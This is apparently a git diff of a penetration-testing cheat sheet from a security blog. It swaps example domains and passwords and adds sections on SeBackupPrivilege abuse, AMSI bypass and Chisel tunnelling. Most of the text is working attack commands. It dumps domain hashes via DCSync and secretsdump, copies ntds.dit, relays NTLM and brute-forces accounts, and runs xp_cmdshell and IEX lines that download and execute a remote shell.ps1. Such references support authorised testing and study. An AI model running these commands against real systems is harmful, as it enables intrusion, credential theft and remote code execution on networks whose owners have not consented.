@@ -1,4 +1,4 @@
- [**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
+[**snovvcrash’s Security Blog**](https://snovvcrash.github.io)
 
 [//]: # (# -- 5 spaces before)
 [//]: # (## -- 4 spaces before)
@@ -220,7 +220,7 @@ PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert
 ```
 
 
-#### SMD
+#### SMB
 
 ##### impacket-smbserver
 
@@ -235,17 +235,19 @@ root@kali:$ impacket-smbserver -smb2support files `pwd`
 Mount SMB in Windows with `net use`:
 
 ```
-root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd1!' -smb2support share `pwd`
+root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > net use Z: \\10.10.14.16\share
-PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd1!'
+PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 ```
 
 Mount SMB in Windows with `New-PSDrive`:
 
 ```
-root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd1!' -smb2support share `pwd`
-PS > $pass = 'Passw0rd1!' | ConvertTo-SecureString -AsPlainText -Force
+root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
+Or
+PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force))
 PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
 PS > cd Z:
 ```
@@ -307,7 +309,7 @@ msf5 > irb
 Mount:
 
 ```
-root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd1!']
+root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
 Status:
@@ -348,7 +350,7 @@ root@kali:$ smbclient -N '\\127.0.0.1\Data'
 With user creds:
 
 ```
-root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd1!'
+root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
 ```
 
 
@@ -367,9 +369,9 @@ $ pipenv install && pipenv shell
 ```
 
 ```
-$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd1!' --shares [--continue-on-success]
-$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' --spider-folder 'E\$' --pattern s3cret
-$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd1!' -d 'CORP' --spider Users --pattern '.'
+$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
+$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
+$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
 ```
 
 
@@ -379,7 +381,7 @@ $ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd1!' -d 'CORP' --spider Users -
 
 ```
 root@kali:$ showmount -e 127.0.0.1
-root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd1!']
+root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
 ```
 
 * [resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
@@ -410,32 +412,32 @@ $ ldapsearch -h 127.0.0.1 -x -s base namingcontexts
 Extract data for the whole domain catalog and then grep your way through:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=example,DC=local" |tee ldap.out
+$ ldapsearch -h 127.0.0.1 -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out
 $ cat ldap.out |grep -i memberof
 ```
 
 Or filter out only what you need:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
+$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(objectClass=User)' sAMAccountName sAMAccountType
 ```
 
 Get `Remote Management Users` group:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -b "DC=example,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=example,DC=local)' |grep -i memberof
+$ ldapsearch -h 127.0.0.1 -x -b "DC=megacorp,DC=local" '(memberOf=CN=Remote Management Users,OU=Groups,OU=UK,DC=megacorp,DC=local)' |grep -i memberof
 ```
 
 Dump LAPS passwords:
 
 ```
-$ ldapsearch -h 127.0.0.1 -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+$ ldapsearch -h 127.0.0.1 -x -b "dc=megacorp,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
 ```
 
 Simple authentication with ldapsearch:
 
 ```
-$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=local' -w 'Passw0rd1!' -s sub -b 'DC=example,DC=local' |tee ldapsearch.log
+$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=megacorp,DC=local' -w 'Passw0rd!' -s sub -b 'DC=megacorp,DC=local' |tee ldapsearch.log
 ```
 
 Analyze large output for anomalies by searching for unique strings:
@@ -453,7 +455,7 @@ $ cat ldapsearch.log | awk '{print $1}' | sort | uniq -c | sort -nr
 Enumerate all AD Computers:
 
 ```
-./windapsearch.py -u 'example.local\snovvcrash' -p 'Passw0rd1!' --dc 127.0.0.1 -C
+./windapsearch.py -u 'megacorp.local\snovvcrash' -p 'Passw0rd!' --dc 127.0.0.1 -C
 ```
 
 
@@ -506,7 +508,7 @@ root@kali:$ python3 -m pip install --upgrade .
 
 ```
 root@kali:$ rpcclient -U '' -N 127.0.0.1
-root@kali:$ rpcclient -U 'snovvcrash%Passw0rd1!' 127.0.0.1
+root@kali:$ rpcclient -U 'snovvcrash%Passw0rd!' 127.0.0.1
 
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
@@ -541,7 +543,7 @@ root@kali:$ samrdump.py 127.0.0.1
 `GetNPUsers.py`:
 
 ```
-$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile hash.asprep |tee GetNPUsers.log
+$ GetNPUsers.py MEGACORP.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile hash.asprep |tee GetNPUsers.log
 $ cat GetNPUsers.log |grep -v 'Client not found in Kerberos database'
 $ ./hashcat64.exe -m 18200 -a 0 -r rules/best64.rule hashes/hash.asprep seclists/Passwords/*
 ```
@@ -573,16 +575,16 @@ PS > Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
 #### Powerview (v2)
 
 ```
-PS > Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
+PS > Add-ObjectAcl -TargetDistinguishedName 'DC=megacorp,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
 ```
 
 
 #### Powerview (v3)
 
 ```
-PS > $pass = 'Passw0rd1!' |ConvertTo-SecureString -AsPlainText -Force
-PS > $cred = New-Object System.Management.Automation.PSCredential('EXAMPLE\snovvcrash', $pass)
-PS > Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
+PS > $pass = 'Passw0rd!' |ConvertTo-SecureString -AsPlainText -Force
+PS > $cred = New-Object System.Management.Automation.PSCredential('MEGACORP\snovvcrash', $pass)
+PS > Add-DomainObjectAcl -TargetIdentity 'DC=megacorp,DC=local' -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
 ```
 
 
@@ -590,7 +592,7 @@ PS > Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentit
 
 ```
 root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
-root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:'Passw0rd1!'@127.0.0.1 -just-dc
+root@kali:$ secretsdump.py MEGACORP.LOCAL/snovvcrash:'Passw0rd!'@127.0.0.1 -just-dc
 ```
 
 1. [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
@@ -600,7 +602,7 @@ root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:'Passw0rd1!'@127.0.0.1 -just
 #### aclpwn.py
 
 ```
-root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' -sp 'Passw0rd1!'
+root@kali:$ aclpwn -f snovvcrash -ft user -t MEGACORP.LOCAL -tt domain -d MEGACORP.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
 ```
 
 1. [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
@@ -616,7 +618,7 @@ root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE
 
 ```
 PS > Import-Module ActiveDirectory
-PS > $acl = get-acl "ad:DC=example,DC=local"
+PS > $acl = get-acl "ad:DC=megacorp,DC=local"
 PS > $user = Get-ADUser snovvcrash
 PS > $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
 PS > $objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
@@ -629,7 +631,7 @@ PS > $acl.AddAccessRule($ace)
 PS > $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
 PS > $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
 PS > $acl.AddAccessRule($ace)
-PS > Set-acl -aclobject $acl "ad:DC=example,DC=local"
+PS > Set-acl -aclobject $acl "ad:DC=megacorp,DC=local"
 ```
 
 1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
@@ -638,7 +640,7 @@ PS > Set-acl -aclobject $acl "ad:DC=example,DC=local"
 #### Mimikatz
 
 ```
-PS > lsadump::dcsync /domain:EXAMPLE.LOCAL /user:krbtgt@EXAMPLE.LOCAL
+PS > lsadump::dcsync /domain:MEGACORP.LOCAL /user:krbtgt@MEGACORP.LOCAL
 ```
 
 1. [adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)
@@ -708,14 +710,14 @@ Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
 PS > . .\SharpHound.ps1
-PS > Invoke-Bloodhound -CollectionMethod All -Domain EXAMPLE.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd1!'
+PS > Invoke-Bloodhound -CollectionMethod All -Domain MEGACORP.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
 ```
 
 Collect graphs via `bloodHound.py` **[1]** (with BloodHound running):
 
 ```
 root@kali:$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
-root@kali:$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd1!' -d EXAMPLE.LOCAL -ns 127.0.0.1
+root@kali:$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
 ```
 
 1. [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
@@ -727,7 +729,7 @@ root@kali:$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd1!' -d EXAMPLE.LO
 List all domain users:
 
 ```
-PS > Get-ADUser -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
+PS > Get-ADUser -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
 Or
 PS > net user /DOMAIN
 ```
@@ -735,7 +737,7 @@ PS > net user /DOMAIN
 List all domain groups:
 
 ```
-PS > Get-ADGroup -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
+PS > Get-ADGroup -Filter * -SearchBase "DC=megacorp,DC=local" | select Name,SID
 Or
 PS > net group /DOMAIN
 ```
@@ -751,7 +753,7 @@ Create new domain user:
 ```
 PS > net user snovvcrash qwe321456 /ADD /DOMAIN
 Or
-PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=example,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
+PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=megacorp,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
 ```
 
 List deleted AD objects (AD recycle bin):
@@ -767,6 +769,8 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 Get DC names:
 
 ```
+PS > nslookup -type=all _ldap._tcp.dc._msdcs.megacorp.local
+
 PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
 PS > $searcher = [ADSISearcher]$ldapFilter
 PS > $searcher.FindAll()
@@ -776,7 +780,7 @@ PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.1135
 
 PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
 
-Cmd > nltest /dsgetdc:example.local
+Cmd > nltest /dsgetdc:megacorp.local
 
 PS > $DomainName = (Get-ADDomain).DNSRoot
 PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
@@ -787,7 +791,7 @@ PS > $AllDCs = (Get-ADForest).GlobalCatalogs
 Get Domain NetBIOS name:
 
 ```
-PS > ([ADSI]"LDAP://example.local").dc
+PS > ([ADSI]"LDAP://megacorp.local").dc
 
 PS > $DomainName = (Get-ADDomain).DNSRoot
 PS > (Get-ADDomain -Server $DomainName).NetBIOSName
@@ -801,33 +805,35 @@ PS > (Get-ADDomain -Server $DomainName).NetBIOSName
 
 
 
-## Exchange
+## Abuse Privileges
 
 
 
-### ActiveSync
+### SeBackupPrivilege
 
 
-#### PEAS
+#### SeBackupPrivilege
 
-* [Accessing Internal Fileshares through Exchange ActiveSync](https://labs.f-secure.com/archive/accessing-internal-fileshares-through-exchange-activesync/)
-
-Install:
+* [github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
 
 ```
-$ git clone https://github.com/FSecureLABS/peas ~/tools/peas && cd ~/tools/peas
-$ python -m virtualenv --python=/usr/bin/python venv && source venv/bin/activate
-$ pip install requests twisted pyOpenSSL lxml service_identity
+wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+
+upload SeBackupPrivilegeCmdLets.dll
+upload SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit -Overwrite
+download ntds.dit
 ```
 
-Run:
+
+#### robocopy
 
 ```
-$ python -m peas --check -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
-$ python -m peas --list-unc='\\DC02' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
-$ python -m peas --list-unc='\\DC02\SYSVOL' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
-$ python -m peas --list-unc='\\DC02\SYSVOL\corp.local' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
-$ python -m peas --list-unc='\\DC02\NETLOGON' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.local
+PS > cmd /c where robocopy
+PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 ```
 
 
@@ -860,7 +866,7 @@ Create shadow volume:
 
 ```
 powershell -c "Add-Content add_vol.txt 'set context persistent nowriters'"
-powershell -c "Add-Content add_vol.txt 'set metadata c:\windows\system32\spool\drivers\color\example.cab'"
+powershell -c "Add-Content add_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
 powershell -c "Add-Content add_vol.txt 'set verbose on'"
 powershell -c "Add-Content add_vol.txt 'begin backup'"
 powershell -c "Add-Content add_vol.txt 'add volume c: alias DCROOT'"
@@ -892,7 +898,7 @@ Delete shadow volume:
 
 ```
 powershell -c "Add-Content delete_vol.txt 'set context persistent nowriters'"
-powershell -c "Add-Content delete_vol.txt 'set metadata c:\windows\system32\spool\drivers\color\example.cab'"
+powershell -c "Add-Content delete_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
 powershell -c "Add-Content delete_vol.txt 'set verbose on'"
 powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
 powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
@@ -905,7 +911,7 @@ Clean up:
 ```
 cmd /c net share pentest /delete
 rm -re -fo C:\smb_pentest
-rm c:\windows\system32\spool\drivers\color\example.cab
+rm C:\Windows\Temp\meta.cab
 rm add_vol.txt
 rm delete_vol.txt
 ```
@@ -947,6 +953,21 @@ $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds
 
 * [blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
 * [bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/](https://bestestredteam.com/2019/01/27/powershell-execution-policy-bypass/)
+
+
+
+
+## AMSI Bypass
+
+
+
+### Evil-WinRM + IEX
+
+```
+*Evil-WinRM* PS > menu
+*Evil-WinRM* PS > Bypass-4MSI
+*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
+```
 
 
 
@@ -1002,6 +1023,18 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 * [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
 * [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)
+
+
+
+### cmstp.exe
+
+* [0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+
+
+
+### Bypass-UAC
+
+* [github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
 
 
 
@@ -1154,7 +1187,7 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 ### MySQL (MariaDB)
 
 ```
-root@kali:$ mysql -u snovvcrash -p'Passw0rd1!' -e 'show databases;'
+root@kali:$ mysql -u snovvcrash -p'Passw0rd!' -e 'show databases;'
 ```
 
 
@@ -1230,7 +1263,7 @@ $ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
 #### sqsh
 
 ```
-root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'Passw0rd1!'
+root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
 2> GO
 ```
@@ -1239,7 +1272,7 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'Passw0rd1!'
 #### mssqlclient.py
 
 ```
-root@kali:$ mssqlclient.py EXAMPLE/snovvcrash:'Passw0rd1!'@127.0.0.1 [-windows-auth]
+root@kali:$ mssqlclient.py MEGACORP/snovvcrash:'Passw0rd!'@127.0.0.1 [-windows-auth]
 SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
 ```
 
@@ -1250,7 +1283,7 @@ SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).Dow
 
 ```
 root@kali:$ python -m pip install mssql-cli
-root@kali:$ mssql-cli -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'Passw0rd1!'
+root@kali:$ mssql-cli -S 127.0.0.1 -U 'MEGACORP\snovvcrash' -P 'Passw0rd!'
 ```
 
 
@@ -1713,7 +1746,7 @@ VRFY exists@exmaple.com
 EXPN exists@exmaple.com
 ```
 
-Check if users could be enumerated:
+Check if users could be enumerated with `RCPT TO`:
 
 ```
 $ telnet mail.example.com 25
@@ -1822,6 +1855,9 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 1. [github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
 2. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
 
+* Attacker's IP: 10.10.13.37
+* Victims's IP: 10.10.13.38
+
 Reverse forward port 1111 from Windows machine to port 2222 on Linux machine:
 
 ```
@@ -1832,20 +1868,34 @@ root@kali:$ wget [1/windows]
 root@kali:$ gunzip chisel*.exe.gz && rm chisel*.exe.gz && mv chisel*.exe chisel.exe && upx chisel.exe
 root@kali:$ md5sum chisel.exe
 
-root@kali:$ ./chisel server -p 8000 -v -reverse
+root@kali:$ ./chisel server -p 8000 -v --reverse
 
-PS > (new-object net.webclient).downloadfile("http://127.0.0.1/chisel.exe", "$env:userprofile\music\chisel.exe")
+PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS > get-filehash -alg md5 chisel.exe
-PS > Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
+PS > Start-Process -NoNewWindows chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
 
-Socks5 proxy with Chisel:
+Socks5 proxy with Chisel in server mode:
 
 ```
-1. root@kali:$ ./chisel server -p 8000 -reverse
-2. user@victim:$ ./chisel client 10.14.14.5:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
+1. user@victim:$ ./chisel server -p 8000 --socks5 &
+2. root@kali:$ ./chisel client 10.10.13.38:8000 socks
+```
+
+Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel now supports socks5 in client mode):
+
+```
+1. root@kali:$ ./chisel server -p 8000 --reverse
+2. user@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
 3. user@victim:$ ./chisel server -v -p 8002 --socks5 &
 4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
+```
+
+Socks5 proxy with Chisel in client mode:
+
+```
+1. root@kali:$ ./chisel server -p 8000 --reverse --socks5
+2. user@victim:$ ./chisel client 10.10.13.37:8000 R:socks
 ```
 
 
@@ -1855,8 +1905,8 @@ Socks5 proxy with Chisel:
 * [github.com/kost/revsocks](https://github.com/kost/revsocks)
 
 ```
-1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd1!'
-2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd1!'
+1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
+2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
 ```
 
 
@@ -1996,7 +2046,7 @@ root@kali:$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
 Run:
 
 ```
-root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd1!' -i 127.0.0.1 -s `pwd` -e `pwd`
+root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 ```
 
 * [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
@@ -2004,7 +2054,7 @@ root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd1!' -i 127.0.0.1 -s `pwd` -e
 ##### psexec.py
 
 ```
-root@kali:$ psexec.py snovvcrash:'Passw0rd1!'@127.0.0.1
+root@kali:$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
 root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -2013,7 +2063,7 @@ root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0
 ##### wmiexec.py
 
 ```
-root@kali:$ wmiexec.py snovvcrash:'Passw0rd1!'@127.0.0.1
+root@kali:$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
 root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -2104,7 +2154,7 @@ Run as another user:
 
 ```
 PS > $user = '<HOSTNAME>\<USERNAME>'
-PS > $pass = ConvertTo-SecureString 'Passw0rd1!' -AsPlainText -Force
+PS > $pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
 
 PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
@@ -2670,7 +2720,7 @@ EOF
 ### cewl
 
 ```
-$ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://example.local/somedir/logs/html/index.htm
+$ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://megacorp.local/somedir/logs/html/index.htm
 ```
 
 
@@ -2735,7 +2785,7 @@ $ sudo apt install openjdk-11-jdk
 ```
 * Check src
 $ whatweb http://127.0.0.1
-$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,ini,config,cfg,xml,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 $ nikto -h http://127.0.0.1 -Cgidirs all
 ```
 
@@ -2755,11 +2805,11 @@ root@kali:$ crackmapexec smb 127.0.0.1
 root@kali:$ crackmapexec smb 127.0.0.1 -u 'anonymous' -p '' --shares
 root@kali:$ smbclient -N -L 127.0.0.1
 root@kali:$ rpcclient -U '' -N 127.0.0.1
-root@kali:$ kerbrute userenum -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
-root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -request
+root@kali:$ kerbrute userenum -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
+root@kali:$ GetNPUsers.py MEGACORP.LOCAL/ -dc-ip 127.0.0.1 -request
 root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-root@kali:$ kerbrute bruteuser -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
-root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd1!' -i 127.0.0.1 -s `pwd` -e `pwd`
+root@kali:$ kerbrute bruteuser -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
+root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 
 PS > systeminfo
 PS > whoami /priv (whoami /all)
@@ -2783,6 +2833,7 @@ PS > ipconfig /all
 PS > route print
 PS > dir -force c:\
 PS > [Environment]::Is64BitOperatingSystem
+PS > (wmic os get OSArchitecture)[2]
 PS > $ExecutionContext.SessionState.LanguageMode
 
 PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
@@ -2795,6 +2846,10 @@ PS > .\winPEAS.bat
 PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
